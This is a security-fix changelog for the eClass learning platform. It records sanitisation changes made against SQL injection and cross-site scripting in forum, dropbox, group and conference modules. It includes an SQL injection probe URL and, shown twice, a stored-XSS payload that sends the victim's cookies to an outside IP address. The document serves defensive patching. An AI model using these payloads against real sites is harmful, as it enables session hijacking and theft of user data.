# Changelog for eClass


### Changes in /include/lib/


#### Changes in main.lib.php
 * Changed db_query to not display error info of sql_queries
 * ? more here

### Changes in /module/phbb/
#### viewforum.php && viewtopic.php
   * Added checking if $_GET['forum'] is a number and complies with the UTF-8 standard lines 75 - 81. This should prevent this page from sql injections   

#### newtopic.php & functions.php & reply.php
  * We can have injections here from $_GET['forum'] attribute. More specifically if we send non numeric values through the $_GET we have an sql error reporting rendered. This is wrong.
  We added lines 83-91 in order to be sure that the input incoming from the $_GET['forum'] is correct and we suppressed the sql error output  
   ** hint ** sql possible injection here http://geza.csec.gr/modules/phpbb/newtopic.php?forum=1%27%20%20or%20%27a%27

  * The above xss attack can be used here
  * Also this attack when selecting html in the xinha editor
  ```html  
  <html>
  <script>window.onload=function() {
  console.log('hey');
  var link = "http://195.134.67.223:8095?";
  var cookie = document.cookie.split(";");
  link = link.concat(cookie);
  window.location = link;
  }</script>
  </html>
  ```  
  In order to stop incoming xss attacks we have added a function in functions.php called stripUnwantedTagsAndAttrs which allows only specific tags to  be accepted. Possibly here if we change the encoding we might have problems. **check this again**  
  * Actually we have to remove that since this function removes completely user input if the text is plain text. So we have to use htmlescapechars. So we used htmlescapechars when getting the message as well as also when rendering the reply
  * subject seems to be safe with the strip tags function

#### reply.php & new topic.php
  * Possible persistent xss attack here by selecting html in editor and then writing:
  ```html  
  <html>
  <script>window.onload=function() {
  console.log('hey');
  var link = "http://195.134.67.223:8095?";
  var cookie = document.cookie.split(";");
  link = link.concat(cookie);
  window.location = link;
  }</script>
  </html>
 ```  

#### editpost.php  
  * we did the same here. We applied sanitization tehniques to the url parameters as well as htmlescapechars when rendering the editpost because the script could be executed on the admin side and take control of session.
  Changes on lines 80 - 103 and changes on 354 & 362  


#### Changes in modules/dropbox/dropbox_submit.php
   * Sanitized input from $_POST parameters of the form in order to stop xss attacks. Used htmlspecialchars.  

#### Changes in /modules/group/group_space.php
 * Possible sql injection here, forced the group parameter to be always numeric and in UTF-8 format

 #### Changes in /modules/group/document.php
 * possible sql injection here showing the contents of the server folder
 * used htmlspecialchars to stop xss in the name of a new folder

#### Changes in in modules/conference/messageList.php
 * added htmlspecialchars to avoid xss attacks
